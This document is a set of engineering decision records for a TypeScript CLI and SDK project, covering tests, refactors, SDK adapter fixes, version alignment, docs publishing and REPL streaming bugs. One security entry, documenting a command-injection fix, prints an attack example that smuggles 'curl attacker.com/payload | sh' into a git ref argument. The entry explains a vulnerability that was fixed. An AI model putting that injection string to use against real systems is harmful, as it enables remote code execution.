3. **`test/model-fallback.test.ts`** (25 tests) — Cross-tier fallback chain exhaustion, tier ceiling enforcement (fast never escalates to premium), provider preference reordering ("use Claude" stays in Claude family), nuclear fallback (all models exhausted → null).
4. **`test/cli/upstream-clone.test.ts`** (40 tests) — Git ref validation (14 injection vectors rejected), upstream name validation, source type detection, git clone arg construction, failure recovery messages, file I/O round-trips, gitignore idempotency.

## Why

Audit identified these as the highest-risk untested paths. Shell integration had zero tests for the end-to-end lifecycle. HealthMonitor had no tests at all. Model fallback had catalog tests but no chain-walk or tier-ceiling tests. Upstream git clone had resolver tests but no validation or error recovery tests.

## Impact

- Test count: 2022 → 2136 (114 new tests, +5.6%)
- Test files: 74 → 78 (4 new files)
- Zero regressions — all 2136 tests pass
- No existing test files modified

## Constraints Respected

- Vitest patterns throughout (describe/it/expect/vi.mock/vi.fn)
- Mock SDK client for health tests — no real Copilot connection
- New test files only — no modifications to existing 74 test files
- Exceeds minimum target of 50 new tests (delivered 114)


# Decision: REPL Shell Polish Architecture

**By:** Fortier
**Date:** 2026-02-22
**Scope:** Shell UI components (`App.tsx`, `AgentPanel.tsx`, `MessageStream.tsx`, `InputPrompt.tsx`, `lifecycle.ts`)

## What

Role emoji mapping and welcome data loading live in `lifecycle.ts` alongside team manifest parsing. UI components import directly from `../lifecycle.js` — no new props needed on the shell entry point (`index.ts`). All filesystem reads happen inside React `useEffect` hooks at mount time.

## Why

- **Single source of team data**: `lifecycle.ts` already owns `parseTeamManifest()`. Adding `getRoleEmoji()` and `loadWelcomeData()` here keeps all team-data concerns in one module. Components don't need to know about `.squad/` directory structure.
- **No SDK wiring changes**: Loading welcome data inside `App.tsx` via `useEffect` avoids any changes to `index.ts` and the coordinator/session wiring. The welcome screen is purely additive UI.
- **Fail-safe**: `loadWelcomeData()` returns `null` on any error. Components gracefully degrade — if `.squad/team.md` or `.squad/identity/now.md` is missing, the header still shows version and hints.

## Team Impact

- **Component authors**: `AgentPanel` now accepts optional `streamingContent` prop; `MessageStream` accepts optional `agents` and `processing` props. Both are backward-compatible (props are optional with defaults).
- **Role emoji map**: New roles should be added to the `map` in `getRoleEmoji()` in `lifecycle.ts`. Unknown roles get `🔹` fallback.
- **ThinkingIndicator**: 80ms `setInterval` runs only while the indicator is mounted. Cleanup is automatic via React effect teardown. No event loop concerns.


### 2026-02-22: spawn.ts wired to SquadClient — self-contained agent spawning
**By:** Fenster (Core Dev)
**Status:** IMPLEMENTED

**What:** `spawnAgent()` in `packages/squad-cli/src/cli/shell/spawn.ts` now accepts an optional `client: SquadClient` via `SpawnOptions`. When a client is provided, it creates a real SDK session (streaming, system prompt from charter, working directory), sends the task message, accumulates streamed `message_delta` events, closes the session, and returns the full response in `SpawnResult`.

**Why:** Phase 3 blocker — spawn was a stub returning a placeholder string. Now it's a working SDK integration that can be used from the Ink shell, coordinator, CLI commands, or any programmatic consumer.

**Design decisions:**
1. **Client via options, not parameter** — Adding `client` to `SpawnOptions` instead of a positional parameter preserves backward compatibility. Callers that don't provide a client get a graceful stub.
2. **Self-contained, no shell dependency** — Unlike `dispatchToAgent()` in shell/index.ts which wires into Ink state (ShellApi, StreamBridge), spawn.ts owns its own session lifecycle. This makes it usable outside the shell.
3. **Session-per-spawn** — Each spawn creates and closes its own session. This is intentional for isolation. Long-lived sessions can be managed externally and passed via a future `session` option if needed.

**Error handling audit (same PR):**
- `plugin.ts`: Removed unused `error` import from output.ts (was dead code, `fatal()` from errors.ts already used correctly).
- `upgrade.ts`: Removed unused `error as errorMsg` import from output.ts (same pattern).
- `upstream.ts`: Has `import { error as fatal } from output.ts` bug — **not touched** (Baer owns it).
- **Convention:** For CLI-exiting errors, use `fatal()` from `cli/core/errors.ts` (throws `SquadError`, returns `never`). For non-fatal operational warnings, `error()` from `output.ts` is fine.

**Files changed:**
- `packages/squad-cli/src/cli/shell/spawn.ts` — Rewired spawnAgent, added client/teamRoot to SpawnOptions
- `packages/squad-cli/src/cli/commands/plugin.ts` — Removed unused error import
- `packages/squad-cli/src/cli/core/upgrade.ts` — Removed unused errorMsg import

**Build:** Clean (0 errors). **Tests:** 47 shell tests passing.


# Decision: Extract hardcoded values to central constants

**Author:** Edie (TypeScript Engineer)
**Date:** 2026-02-22
**Status:** Implemented

## Context

The code audit found model names, timeouts, and role mappings duplicated across 6+ files. Values had already drifted — e.g., `model-selector.ts` had 4-entry fallback chains while `config.ts` and `init.ts` had 3-entry chains with different models. This violated single-source-of-truth and created silent inconsistency risk.

## Decision

Created `packages/squad-sdk/src/runtime/constants.ts` as the canonical source for:

- **`MODELS`** — `DEFAULT`, `SELECTOR_DEFAULT`, `SELECTOR_DEFAULT_TIER`, `FALLBACK_CHAINS` (3 tiers × 4 models each), `NUCLEAR_FALLBACK`, `NUCLEAR_MAX_RETRIES`. All `as const`.
- **`TIMEOUTS`** — `HEALTH_CHECK_MS` (5000), `GIT_CLONE_MS` (60000), `PLUGIN_FETCH_MS` (15000). All env-overridable via `parseInt(process.env[...] ?? default, 10)`.
- **`AGENT_ROLES`** — `readonly` tuple deriving `AgentRole` type.

## Files updated

| File | Change |
|------|--------|
| `runtime/constants.ts` | **Created** — single source of truth |
| `agents/model-selector.ts` | Removed local `FALLBACK_CHAINS`, `DEFAULT_MODEL`, `DEFAULT_TIER`; imports from constants |
| `runtime/config.ts` | `DEFAULT_CONFIG` uses `MODELS.*`; `AgentRole` re-exported from constants |
| `runtime/health.ts` | Default timeout uses `TIMEOUTS.HEALTH_CHECK_MS` |
| `config/init.ts` | Template generators use `MODELS.*` for all model values |
| `cli/commands/plugin.ts` | Browse timeout uses `TIMEOUTS.PLUGIN_FETCH_MS` |
| `index.ts` | Named exports: `MODELS`, `TIMEOUTS`, `AGENT_ROLES` |
| `package.json` | Added `./runtime/constants` subpath export |

**Not touched:** `upstream.ts` (Baer owns), `benchmarks.ts` (synthetic simulation data, not config).

## Rationale

- `as const` gives literal types + `readonly` — prevents accidental mutation
- Environment variable overrides enable runtime configuration without code changes
- Named exports (not `export *`) from barrel avoid `AgentRole` collision with casting module's different `AgentRole` type
- Spreading `[...MODELS.FALLBACK_CHAINS.tier]` converts readonly tuples to mutable arrays for interface compatibility

## Verification

- Build: zero TypeScript errors
- Tests: 2138/2141 passed (3 failures are pre-existing Docker/Aspire infrastructure tests)


# Decision: Fix CWE-78 Command Injection in upstream.ts

**Date:** 2026-02-22
**Author:** Baer (Security)
**Requested by:** Brady
**Status:** IMPLEMENTED

## Context

Security audit of `packages/squad-cli/src/cli/commands/upstream.ts` identified 3 CWE-78 (OS Command Injection) vulnerabilities. All three used `execSync` with string interpolation, allowing shell metacharacters in user-supplied `--ref`, `--name`, and source arguments to execute arbitrary commands.

**Attack example:** `squad upstream add https://repo --ref "main && curl attacker.com/payload | sh"`

## Changes Made

1. **Replaced `execSync` → `execFileSync` with array arguments** (3 call sites: add-clone, sync-pull, sync-clone). `execFileSync` bypasses the shell entirely — arguments are passed directly to the `git` binary.

2. **Added input validation functions:**
   - `isValidGitRef(ref)` — allows only `[a-zA-Z0-9._\-/]+`
   - `isValidUpstreamName(name)` — allows only `[a-zA-Z0-9._-]+`
   - Both reject shell metacharacters (`&`, `|`, `;`, backticks, `$`, etc.)

3. **Fixed `fatal` import:** Changed from `error as fatal` (output.js — prints but continues) to real `fatal` (errors.js — throws SquadError, exits). Usage-error paths now properly halt execution.

## Verification

- `npm run build` — passes (0 errors)
- `npm test` — 74 test files, 2022 tests passed

## Risk Assessment

- **Before:** Critical — unauthenticated RCE via CLI argument injection
- **After:** Mitigated — defense in depth (no shell + input validation)

---

## Kobayashi Decision: Version Alignment Release 0.8.2 (2026-02-22)

**Status:** ✅ EXECUTED  
**Decided by:** Kobayashi (Git & Release engineer)  
**Requested by:** Brady  
**Context:** Independent feature development caused version drift. Explicit alignment required to unblock publish workflows and establish clear release checkpoint.

### Problem

Three package.json files at different versions:
- Root: 0.6.0-alpha.0
- SDK: 0.8.0
- CLI: 0.8.1

This skew required nuanced tag management and left CI/CD workflows (squad-publish.yml, squad-release.yml) in ambiguous state. Stable release required canonical version.

### Decision

Synchronize all three versions to **0.8.2** and create release tag v0.8.2:
1. Update root `package.json`: 0.6.0-alpha.0 → 0.8.2
2. Update SDK `package.json`: 0.8.0 → 0.8.2
3. Update CLI `package.json`: 0.8.1 → 0.8.2
4. Regenerate package-lock.json via `npm install --package-lock-only`
5. Commit: `chore: align CLI and SDK versions to 0.8.2` (with Copilot co-author trailer)
6. Create tag: v0.8.2 (pushed to origin)
7. Create GitHub Release with version history notes

### Execution

- **Commit:** db5d621 on bradygaster/dev
- **Tag:** v0.8.2 (pushed to origin/v0.8.2)
- **Release:** https://github.com/bradygaster/squad-pr/releases/tag/v0.8.2

### Impact

- ✅ squad-publish.yml now triggers on v* tags → publishes both packages to npm
- ✅ squad-release.yml can validate version consistency across workspace
- ✅ Clear release checkpoint: all packages at 0.8.2
- ✅ CI/CD pipeline unblocked

### Future Versioning

Independent versioning via changesets remains correct between releases. CLI and SDK can evolve at different cadences, tracked in separate changeset files per decision #208. Version alignment at release boundaries is the pattern.

### Precedent

Earlier decision (2026-02-21, Kobayashi) stated that SDK 0.8.0 and CLI 0.8.1 skew was "intentional and appropriate for pre-1.0 development." That decision is superseded by this explicit release checkpoint decision. The skew served its purpose during development; now the workspace synchronizes for v0.8.2 release.


### 2026-02-23T02:01:23Z: User directive
**By:** Brady (via Copilot)
**What:** Never use / or \ as code fences in GitHub issues, PRs, or comments. Only use backticks to format code. Slashes break GitHub markdown rendering.
**Why:** User request — captured for team memory

# Decision: squad doctor command — diagnostic conventions

**Date:** 2026-02-22
**By:** Edie
**Issue:** #312
**Status:** Implemented

## What

`squad doctor` is a diagnostic CLI command that validates .squad/ setup integrity. It always exits 0 — it reports problems, never gates on them.

## Key conventions

1. **DoctorCheck interface** — `{ name, status: 'pass' | 'fail' | 'warn', message }` — the typed contract for every check result.
2. **Mode detection order** — config.json `teamRoot` → remote; `squad-hub.json` → hub; else → local.
3. **Exit code always 0** — doctor is informational. `fatal()` is never used for check failures.
4. **Lazy import in cli-entry.ts** — follows the established pattern (`await import('./cli/commands/doctor.js')`).
5. **Subpath export** — `./commands/doctor` in CLI package.json with types-first condition ordering.

## Why

Inspired by Shayne Boyer's PR #131. Teams need a quick way to validate their .squad/ directory without running a full session. The diagnostic-not-gate pattern means CI can call it without risk.

# Decision: Dual-root ensureSquadPath write validation (#314)

**Date:** 2026-02-23  
**Author:** Edie  
**Issue:** #314  
**Depends on:** #311 (dual-root resolver)  
**Status:** Implemented

## Context

`ensureSquadPath()` validates that file writes stay inside a single `.squad/` root. In remote mode (introduced by #311), there are two valid write roots: `projectDir` (decisions, logs) and `teamDir` (agents, casting, skills). Writes to `teamDir` throw because it's outside the single `squadRoot`.

## Decision

Added two new functions in `packages/squad-sdk/src/resolution.ts` alongside the existing `ensureSquadPath()`:

- **`ensureSquadPathDual(filePath, projectDir, teamDir)`** — validates against both roots plus the system temp directory. Same `path.resolve` + `path.sep` prefix-checking pattern as the original.
- **`ensureSquadPathResolved(filePath, paths)`** — convenience wrapper that destructures a `ResolvedSquadPaths` object (from #311's `resolveSquadPaths()`).

### Backward compatibility

- `ensureSquadPath()` is **unchanged** — no modifications to existing callers.
- New functions are additive exports only.

### Error messages

Changed from "outside the .squad/ directory" to "outside both squad roots" so callers see both paths in the error.

## Tests

13 tests in `test/ensure-squad-path-dual.test.ts`:
- Local mode (single root), remote mode (both roots), rejection, path traversal, subdirectories, exact roots, temp dir, `ResolvedSquadPaths` wrapper.

# Decision: Eliminate unsafe casts in adapter layer

**By:** Edie
**Date:** 2026-02-23
**Closes:** #318, #320, #321, #322

## Context

The adapter layer (`packages/squad-sdk/src/adapter/client.ts`) had multiple type-safety gaps:

1. `listSessions()` used `as unknown as SquadSessionMetadata[]` — passing SDK data through without runtime mapping
2. `getStatus()`, `getAuthStatus()`, `listModels()` returned SDK results directly, relying on implicit `any`-to-typed coercion
3. `SquadClient.on()` used `as any` casts to bridge SDK and Squad event handler types
4. `SquadClientWithPool.on()` was fully untyped `(any, any)`
5. Dead `_squadOnMessage` reference in `sendMessage()` — never set, never used
6. `CopilotSessionAdapter` lacked `sendAndWait()`, `abort()`, `getMessages()` — SDK methods with no adapter surface

## Decision

### Field-mapping over unsafe casts (#318)

All SDK-to-Squad data boundaries now use explicit field-picking:

```typescript
const sessions = await this.client.listSessions();
return sessions.map((s): SquadSessionMetadata => ({
  sessionId: s.sessionId,
  startTime: s.startTime,
  ...
}));
```

This catches SDK type drift at compile time. Applied to `listSessions()`, `getStatus()`, `getAuthStatus()`, `listModels()`.

### Client event types (#321)

Created `SquadClientEventType`, `SquadClientEvent`, `SquadClientEventHandler` in `adapter/types.ts` — distinct from session-level event types. These mirror the SDK's `SessionLifecycleEventType` union (`session.created | session.deleted | session.updated | session.foreground | session.background`). Structural compatibility with the SDK means zero `as any` casts at the boundary.

Pool events in `SquadClientWithPool` now use a typed mapping (`poolToSquadEvent`) instead of `as any`.

### Adapter completeness (#322)

Added `sendAndWait()`, `abort()`, `getMessages()` as optional methods on `SquadSession` interface and implemented them in `CopilotSessionAdapter`. Removed dead `_squadOnMessage` reference. Fixed `(event as any).inputTokens` with typed index access via `SquadSessionEvent`'s `[key: string]: unknown` signature.

### resumeSession() already correct (#320)

Verified: `resumeSession()` already wraps in `CopilotSessionAdapter`. No change needed.

## Result

- Zero `as any` or `as unknown as` casts remain in `adapter/client.ts` and `client/index.ts`
- 2219 tests pass, zero regressions
- Build clean under `strict: true`

# Decision: Dual-root path resolution (projectDir / teamDir)

**Date:** 2026-02-23  
**Author:** Fenster  
**Issue:** #311  
**Status:** Implemented

## Context

Remote squad mode requires separating project-local state (decisions, logs) from team identity assets (agents, casting, skills). A project's `.squad/config.json` can now point to an external team directory via a relative `teamRoot` path.

## Decision

Added `resolveSquadPaths()` alongside the existing `resolveSquad()` in `packages/squad-sdk/src/resolution.ts`.

### Types

- **`SquadDirConfig`** — schema for `.squad/config.json` (`version: number`, `teamRoot: string`, `projectKey: string | null`). Named `SquadDirConfig` to avoid collision with the existing `SquadConfig` type in `config/schema.ts` and `runtime/config.ts`.
- **`ResolvedSquadPaths`** — `{ mode, projectDir, teamDir, config, name, isLegacy }`.

### Resolution rules

1. Walk up from startDir checking `.squad/` then `.ai-team/` (legacy fallback).
2. If `.squad/config.json` exists with a valid `teamRoot` string → **remote mode**: `teamDir = path.resolve(projectRoot, config.teamRoot)` where projectRoot is the parent of the `.squad/` directory.
3. Otherwise → **local mode**: `projectDir === teamDir`.
4. Malformed JSON or missing/invalid `teamRoot` → graceful fallback to local mode.

### Backward compatibility

- `resolveSquad()` is unchanged — returns `string | null` as before.
- `resolveSquadPaths()` is a new, additive export.
- No existing tests or callers affected.

## Constraints

- ESM-only, strict TypeScript.
- Uses `node:fs` and `node:path` — no string concatenation for path building.
- No symlinks — config.json with relative paths only.
- `teamRoot` resolved relative to the project root, not relative to `.squad/`.

# Decision: Adapter Event Name Mapping and Data Normalization

**Date:** 2026-02-22  
**By:** Fenster (Core Dev)  
**Issues:** #316, #317, #319  
**Status:** Implemented

## Context

The `CopilotSessionAdapter` in `packages/squad-sdk/src/adapter/client.ts` mapped methods (`sendMessage` → `send`, `close` → `destroy`) but did NOT map event names or event data shapes. The `@github/copilot-sdk` uses dotted-namespace event types (e.g., `assistant.message_delta`, `assistant.usage`) and wraps payloads in an `event.data` envelope. Our adapter passed short names like `message_delta` and `usage` directly through, causing handlers to silently never fire. The OTel telemetry in `sendMessage()` was therefore dead code — `first_token` never recorded, `tokens.input`/`tokens.output` never populated.

## Decision

1. **Event name mapping via `EVENT_MAP`**: A static `Record<string, string>` maps 10 Squad short names to SDK dotted names. The reverse map is computed automatically. Unknown names pass through unchanged, so callers CAN use the full SDK name directly if they prefer.

2. **Event data normalization via `normalizeEvent()`**: The adapter wraps every handler to flatten `event.data` onto the top-level `SquadSessionEvent` and maps the type back to the Squad short name. This means callers access `event.inputTokens` (not `event.data.inputTokens`) and check `event.type === 'usage'` (not `event.type === 'assistant.usage'`).

3. **Per-event-type unsubscribe tracking**: Changed `unsubscribers` from `Map<handler, unsubscribe>` to `Map<handler, Map<eventType, unsubscribe>>` so the same handler function can be subscribed to multiple event types without the second `on()` overwriting the first's unsubscribe function.

## Alternatives Considered

- **No mapping layer (callers use SDK names directly):** Rejected — breaks the adapter's purpose of decoupling Squad from SDK internals. Also requires changing all callers (violates constraint).
- **Transform at dispatch instead of subscribe:** Would require intercepting `_dispatchEvent` on the inner session, which is fragile and relies on SDK internals.

## Impact

- Zero changes to callers — the adapter normalizes everything transparently
- Zero changes to `SquadSession` interface or `SquadSessionEventType`
- OTel stream tracking now works end-to-end through the adapter
- Future SDK event name changes only require updating `EVENT_MAP`


### 2026-02-23: GitHub Pages publishing architecture (consolidated)
**By:** Keaton (Lead), Fenster (Core Dev), McManus (DevRel)
**Date:** 2026-02-23  
**Status:** Ready for implementation
**Related:** Keaton analysis (architecture), Fenster plan (build tooling), McManus recommendation (content structure)

## What

Establish GitHub Pages publishing for squad-pr documentation and blog, building on team research into the old repo (bradygaster/squad) and current squad-pr infrastructure.

### Three complementary decisions:

1. **Architecture (Keaton):** Ship with current setup — no changes needed. Squad-PR's docs infrastructure is production-ready and lighter than the old repo.
   - Use existing .github/workflows/squad-docs.yml (identical to old repo, already configured)
   - Use docs/build.js (lightweight, ESM-native, zero npm deps)
   - Use docs/guide/ markdown files (8 guides ready to publish, plus 1 audit document)
   - Defer blog support to future wave

2. **Build & Deploy (Fenster):** Upgrade markdown library and establish deployment workflow.
   - Add markdown-it + markdown-it-anchor as devDependencies (better HTML output, syntax highlighting, auto-generated anchor IDs)
   - Refactor docs/build.js (~10-15 lines) to use markdown-it
   - Add npm script: "docs": "node docs/build.js --out dist/docs"
   - Create .github/workflows/pages-deploy.yml (trigger: push to main with paths filter on docs/**, plus workflow_dispatch)
   - Add --base CLI argument support for subpath deployment (recommend --base /squad-pr)
   - Configure GitHub Pages in repo settings (deployment source: GitHub Actions)

3. **Content (McManus):** Publish existing guides + audits; recreate blog with fresh v1 content.
   - Publish /docs/guide/ (14 guides, all sections: Getting Started, Core, Reference, Troubleshooting) — Ready as-is
   - Publish /docs/audits/ (technical transparency builds trust)
   - Keep /docs/launch/ internal only (release notes canonical in CHANGELOG.md per v1 internal-only docs decision)
   - Recreate /docs/blog/ with new v1-specific content (fresh origin story, team integration guides, community wins, feature launches)
   - Do NOT reuse old beta blog posts (different narrative arc: beta "building while building" vs. v1 "proven runtime, production integrations")
   - Blog naming: YYYY-MM-DD-slug.md (searchable, SEO-friendly)
   - Blog YAML frontmatter: title, date, author, tags (releases, features, learnings, community), status

## Why

**Architecture:** Squad-PR's build.js is proven, self-contained, and aligns with ESM-only constraint. Old repo's markdown-it approach adds overhead for features not yet needed. Lightweight approach is maintainable.

**Build & Deploy:** Markdown-it upgrade improves output quality (syntax highlighting, tables, anchor links). npm script + workflow = standardized dev workflow + CI/CD integration. Base path support enables subpath hosting.

**Content:** Three-part strategy respects both product decisions (internal-only docs) and DevRel goals (community, transparency, ownership of v1 milestone). Fresh blog avoids confusing new users about version boundaries. Keeps old beta blog as authentic historical artifact.

## How

1. **Immediate (Keaton validation):**
   - Test local build: 
ode docs/build.js
   - Verify output in docs/dist/
   - Enable GitHub Pages in repo settings (if not already done)
   - Verify deployment to https://bradygaster.github.io/squad-pr/

2. **Build phase (Fenster implementation):**
   - Add markdown-it + markdown-it-anchor to package.json devDeps
   - Refactor docs/build.js to use markdown-it converter
   - Add npm script "docs"
   - Create pages-deploy.yml workflow
   - Add --base CLI argument support
   - Test locally with 
pm run docs
   - Test workflow with push to feature branch

3. **Content phase (McManus guidance):**
   - Determine v1 blog cadence (start with v1.0.0 launch or earlier?)
   - Draft first blog posts (origin story, team integration guide)
   - Set up navigation structure per McManus recommendation
   - Review SEO requirements (if any)

## Timeline

- **Now:** Research complete. Decisions ready for team alignment.
- **Week 1:** Fenster implements build tooling + workflow
- **Week 2:** McManus drafts first blog posts
- **Week 3:** Full site tested, Pages deployed live

## Impact

- Zero breaking changes to existing codebase
- Docs publishing operational end-to-end
- Blog infrastructure ready for v1 narrative
- Team has clear content ownership (McManus) and technical ownership (Fenster)

## Notes

- If markdown-it needs additional plugins (tables, admonitions) in future, it's a simple addition to build.js
- Old repo's workflow pattern (squad-docs.yml) is proven; pages-deploy.yml follows same pattern
- Blog support can iterate independently of docs — no dependency between phases
- Relative asset paths in HTML ensure both local and GitHub Pages deployments work without reconfiguration

# Decision: Remote Squad Mode Awareness in Coordinator Prompt

**Date:** 2025-07-18
**Author:** Verbal
**Related:** #313

## Context

The SDK is adding remote squad mode — where team identity files (agents, casting, skills) live in an external repository and project-scoped files (decisions, logs) stay local. The coordinator prompt (`squad.agent.md`) needed to know about this third resolution strategy so it can correctly resolve paths and pass them to spawned agents.

## Decision

1. Added remote squad mode as a third strategy in the Worktree Awareness section, after worktree-local and main-checkout.
2. Introduced `PROJECT_ROOT` as a second variable in spawn templates. `TEAM_ROOT` points to team identity; `PROJECT_ROOT` points to project-local `.squad/`. In local mode they're identical.
3. Added @copilot incompatibility note — remote mode requires filesystem traversal that the GitHub Copilot coding agent cannot perform.

## Rationale

- The coordinator is the single point of path resolution. If it doesn't know about remote mode, no spawned agent will get correct paths.
- Two variables (`TEAM_ROOT` + `PROJECT_ROOT`) keep the split explicit rather than requiring agents to parse config.json themselves.
- The @copilot note prevents confusion when users try to assign remote-mode work to the coding agent.


# 2026-02-23: sendMessage REPL Bug — Fixed via SDK Version Pin + Test Suite

**By:** Fenster, Hockney, Kujan  
**Date:** 2026-02-23  
**Status:** ✅ Complete (SDK pinned, tests added, audit complete)  
**Issues:** REPL `sendMessage is not a function` error

## Context

Brady reported that the REPL in `@bradygaster/squad-cli@0.8.2` throws `coordinatorSession.sendMessage is not a function`. The CLI imports `SquadClient` and creates sessions via `client.createSession()`, wrapped by `CopilotSessionAdapter` to map `sendMessage()` → `send()`. The error indicated raw SDK sessions leaking through.

## Root Cause

The CLI's `package.json` had `"@bradygaster/squad-sdk": "*"` which resolves to any available version in production. An older SDK version lacking `CopilotSessionAdapter` wrapping caused the mismatch.

## Decision: Pin SDK version to 0.8.2

```json
"@bradygaster/squad-sdk": "0.8.2"
```

Both packages versioned at 0.8.2 and published together as a matched set. Exact pin ensures production installs get the correct SDK version while workspace development resolves to local packages. Breaking changes in SDK now require coordinated CLI version bumps.

**Alternative considered & rejected:** Caret range `^0.8.0` would allow patch/minor mismatches that could break compatibility.

## Verification

- **Tests:** Hockney created 110 new comprehensive tests in `test/cli-shell-comprehensive.test.ts` covering all 9 shell modules (coordinator, spawn, lifecycle, router, sessions, commands, memory, autocomplete, sendMessage validation). All 110 passing.
- **Audit:** Kujan audited the full adapter chain. Confirmed `CopilotSessionAdapter` correctly maps `sendMessage` → `send`. Identified that published 0.8.2 npm package has the old unsafe cast, but the fix exists in current codebase (not yet published).

## Impact

- ✅ sendMessage operations now functional in REPL
- ✅ Full shell infrastructure tested (110 new tests)
- ✅ Known issue: published npm 0.8.2 has unsafe cast (current codebase fix pending publish)
- ✅ Version alignment enables reliable production deployments

# 2026-02-23: User Directive — Docs Overhaul & Publication Pause (consolidated)

**By:** Brady (via Copilot)  
**Date:** 2026-02-23  
**Status:** Active — awaiting Brady sign-off before docs publication

## What

1. **Pause docs publication:** Do not publish docs live until Brady explicitly gives go-ahead. Build locally only.
2. **Docs redesign directives:**
   - Trim down — remove old beta-era folder references
   - Tone: lighthearted, welcoming, fun (NOT stuffy; match original Squad voice)
   - First doc should be "first experience" with squad CLI (NOT deep tech dive)
   - Reference docs (CLI, SDK, config) in single TOC section
   - All docs: brief, prompt-first, action-oriented, fun
   - Human tone throughout

## Why

User request — captured for team memory. Brady wants docs that feel like original beta content, not enterprise documentation. Publication freeze prevents premature rollout while redesign is underway.

### 2026-02-23: Use sendAndWait for streaming dispatch
**By:** Kovash (REPL Expert)
**Date:** 2026-02-23
**Scope:** Shell dispatch pipeline (`packages/squad-cli/src/cli/shell/index.ts`)

## What

Both `dispatchToAgent()` and `dispatchToCoordinator()` now use `sendAndWait()` instead of `sendMessage()` to wait for the full streamed response before proceeding. A fallback path listens for `turn_end`/`idle` events if `sendAndWait` is unavailable.

## Why

`sendMessage()` wraps the SDK's `send()` which is fire-and-forget — it resolves immediately, before any streaming deltas arrive. This caused the coordinator prompt to be parsed against an empty `accumulated` string, producing "coordinator:" with no content.

## Pattern

```typescript
async function awaitStreamedResponse(session, prompt) {
  if (session.sendAndWait) {
    await session.sendAndWait({ prompt }, 120_000);
  } else {
    // fallback: wait for turn_end or idle event
  }
}
```

The `message_delta` listener is kept for progressive UI updates; `awaitStreamedResponse` only gates when we proceed to parse.

## Impact

All agents must use `awaitStreamedResponse` (or equivalent) when they need the full response text. Never parse `accumulated` after a bare `sendMessage()`.

## Tested

Created `test/repl-streaming.test.ts` (13 tests). All 2351 tests pass.




# Decision: SQUAD_DEBUG Diagnostic Logging for REPL Streaming

**Date:** 2026-02-23
**Author:** Kovash (REPL & Interactive Shell)
**Status:** Implemented

## Context

Brady reported the REPL is still broken after the `deltaContent` fix — empty coordinator responses, no streaming content visible. The compiled output was verified correct. Without runtime visibility, we cannot determine if: (a) delta events never fire, (b) `sendAndWait` returns `undefined`, (c) handler errors are silently swallowed by the SDK, or (d) the session isn't actually in streaming mode.

## Decision

Added `SQUAD_DEBUG=1` environment variable gating for diagnostic `console.error()` calls at every critical point in the streaming pipeline. Logs go to stderr to avoid interfering with Ink rendering.

### Logging points:
- `dispatchToCoordinator` entry (message being sent)
- `dispatchToAgent` entry (agent name + message)
- `onDelta` fire (event type)
- `extractDelta` (event keys, whether `deltaContent` exists, extracted value)
- `awaitStreamedResponse` (sendAndWait result type, keys, has data)
- Accumulated vs fallback lengths after sendAndWait resolves
- `parseCoordinatorResponse` decision type

### Infrastructure:
- `.env` file at repo root with `SQUAD_DEBUG=1`
- Lightweight `.env` parser in `cli-entry.ts` (no `dotenv` dependency)
- VS Code launch.json `envFile` property for both REPL configurations

## Key SDK Findings

The `@github/copilot-sdk` `_dispatchEvent` method wraps every handler call in `try/catch` with empty catch blocks. If our `normalizeEvent` or delta handler throws, the error is silently swallowed. The SQUAD_DEBUG logging will expose whether handlers are being called at all.

## Next Steps

Brady should run with `SQUAD_DEBUG=1` and share the stderr output. The logs will tell us exactly where the pipeline breaks down.


# Streaming Bug Report — Hockney

**Filed by:** Hockney (Tester)
**Date:** 2026-02-22

## Bug 1: Empty coordinator response — the "silent swallow"

**Symptom:** Brady sees empty coordinator responses in REPL.

**Root cause chain:**
1. `awaitStreamedResponse()` calls `session.sendAndWait()` which may return `undefined` (no `data.content` fallback)
2. If the SDK also emits zero `message_delta` events (network issue, timeout, model quirk), `accumulated` stays empty
3. `dispatchToCoordinator` hits `if (!accumulated && fallback)` — but fallback is also empty string
4. `parseCoordinatorResponse('')` returns `{ type: 'direct', directAnswer: '' }` — empty direct answer
5. The shell shows this empty string as the coordinator's response with no error, no warning, no retry

**Why this is bad:** The pipeline treats "got nothing" the same as "answered with nothing." There's no distinction between a successful empty response and a total failure to get any response.

**Fix recommendation:**
- After `awaitStreamedResponse`, if accumulated is empty string AND fallback is empty, throw or warn — don't silently proceed
- Or: add a minimum-length check on coordinator responses before parsing
- Related: the `extractDelta` fix was necessary but not sufficient — the fallback path also needs to actually produce content

## Bug 2: Test helper `simulateDispatch` didn't replicate fallback

**What:** The existing `simulateDispatch()` test helper ignores the return value of `sendAndWait()`. The real `awaitStreamedResponse()` extracts `result.data.content` as a fallback. This means tests were only exercising the delta path, never the fallback path. Added `simulateDispatchWithFallback` to cover this gap.

## Gap: No SQUAD_DEBUG diagnostic logging

**What:** There is no `SQUAD_DEBUG` env var or any diagnostic logging in the dispatch pipeline. When streaming silently fails, there's zero visibility into what happened. Marked as `it.todo()` in tests. Recommend implementing debug logging on the dispatch path to help diagnose future streaming issues.


# Decision: extractDelta field priority — deltaContent first

**Author:** Kovash (REPL & Interactive Shell Expert)
**Date:** 2026-02-23
**Status:** Implemented

## Context

The `@github/copilot-sdk` `assistant.message_delta` event uses `deltaContent` as the field name for streamed text chunks. After `normalizeEvent()` spreads `sdkEvent.data` onto the top-level event object, the field name is `deltaContent` — not `delta` or `content`.

The old `extractDelta()` checked only `delta` and `content`, silently returning `''` for every delta event, causing blank "coordinator:" responses in the shell.

## Decision

1. **extractDelta priority:** `deltaContent` > `delta` > `content` — matches SDK actual format while preserving backward compat.
2. **awaitStreamedResponse returns fallback:** The `sendAndWait` return value (`result.data.content`) is now captured and returned as a fallback string. Both dispatch functions use it if delta accumulation is empty.
3. **Tests updated:** All mock sessions and `simulateDispatch` now use `deltaContent`. Added legacy `delta` key test for backward compat coverage.

## Impact

- Fixes blank coordinator/agent responses in the REPL shell.
- All 29 streaming tests pass. Full suite (2362 tests) unaffected.
- Team members working on SDK event handling should use `deltaContent` as the canonical field name.


# Decision: Wire OpenTelemetry into the REPL shell startup

**Author:** Kovash (Copilot SDK Expert / Backend Dev)
**Date:** 2026-02-23
**Status:** Implemented

## Context

Brady has the Aspire dashboard running in Docker (port 4317 reachable), but the REPL launched via `squad` produced no telemetry. Root cause: `runShell()` never called `initSquadTelemetry()` even though the SDK had everything ready.

## Decision

1. **`runShell()` now initializes OTel** — calls `initSquadTelemetry({ serviceName: 'squad-cli' })` early in the function, before lifecycle init. Telemetry handle is shut down in the cleanup block alongside sessions and lifecycle.

2. **Telemetry status message uses `console.error`** — not `renderer.info()` (which doesn't exist on ShellRenderer) and not `console.log` (which would interfere with Ink rendering). The `🔭 Telemetry active` message goes to stderr.

